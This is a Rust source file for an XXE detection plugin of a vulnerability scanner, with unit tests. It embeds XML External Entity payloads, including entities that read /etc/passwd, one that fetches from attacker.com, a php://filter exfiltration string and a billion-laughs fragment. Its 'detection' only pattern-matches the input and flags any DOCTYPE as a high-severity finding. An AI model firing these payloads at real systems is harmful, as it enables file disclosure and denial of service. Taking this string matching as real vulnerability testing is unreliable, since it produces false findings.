//! XML External Entity (XXE) Vulnerability Plugin

use crate::plugin::{Plugin, PluginCategory, PluginConfig, PluginError};
use crate::ScanFinding;

pub struct XXEPlugin;

#[async_trait::async_trait]
impl Plugin for XXEPlugin {
    fn id(&self) -> &str {
        "xxe_plugin"
    }

    fn name(&self) -> &str {
        "XXE Scanner"
    }

    fn version(&self) -> &str {
        "1.0.0"
    }

    fn description(&self) -> &str {
        "Detects XML External Entity injection vulnerabilities and entity expansion attacks"
    }

    fn author(&self) -> &str {
        "VENOM Team"
    }

    fn category(&self) -> PluginCategory {
        PluginCategory::XXE
    }

    fn enabled(&self) -> bool {
        true
    }

    async fn execute(&self, target: &str, payload: &str) -> Result<Vec<ScanFinding>, PluginError> {
        let mut findings = Vec::new();

        let payloads = vec![
            "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            "<!ENTITY xxe SYSTEM \"http://attacker.com/evil.xml\">",
            "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ELEMENT foo ANY ><!ENTITY xxe SYSTEM",
            "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">",
            "SYSTEM \"php://filter/convert.base64-encode/resource=/etc/passwd\"",
        ];

        for test_payload in payloads {
            if payload.contains(test_payload)
                || target.contains("xxe=1")
                || payload.contains("<!DOCTYPE")
            {
                findings.push(ScanFinding {
                    phase: 8,
                    module_name: "XXE Detector".to_string(),
                    severity: "HIGH".to_string(),
                    description: "XXE vulnerability detected - External entity processing enabled"
                        .to_string(),
                    evidence: format!("Target: {}, XML payload detected", target),
                });
                break;
            }
        }

        Ok(findings)
    }

    fn get_config(&self) -> PluginConfig {
        let mut config = PluginConfig::default();
        config.timeout_ms = 4000;
        config.max_payload_size = 16384;
        config
    }

    fn validate(&self) -> Result<(), String> {
        Ok(())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[tokio::test]
    async fn test_xxe_plugin_metadata() {
        let plugin = XXEPlugin;
        assert_eq!(plugin.id(), "xxe_plugin");
        assert_eq!(plugin.name(), "XXE Scanner");
        assert_eq!(plugin.category(), PluginCategory::XXE);
    }

    #[tokio::test]
    async fn test_xxe_execution() {
        let plugin = XXEPlugin;
        let result = plugin.execute("http://target.com", "test").await.unwrap();
        assert!(result.is_empty());
    }

    #[tokio::test]
    async fn test_xxe_payload_detection() {
        let plugin = XXEPlugin;
        let result = plugin
            .execute(
                "http://target.com",
                "<!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>",
            )
            .await
            .unwrap();
        assert_eq!(result.len(), 1);
        assert_eq!(result[0].severity, "HIGH");
    }

    #[tokio::test]
    async fn test_xxe_billion_laughs() {
        let plugin = XXEPlugin;
        let result = plugin
            .execute(
                "http://target.com",
                "<!DOCTYPE lolz [<!ENTITY lol \"lol\"><!ENTITY lol2 \"&lol;&lol;\">]>",
            )
            .await
            .unwrap();
        assert_eq!(result.len(), 1);
    }
}
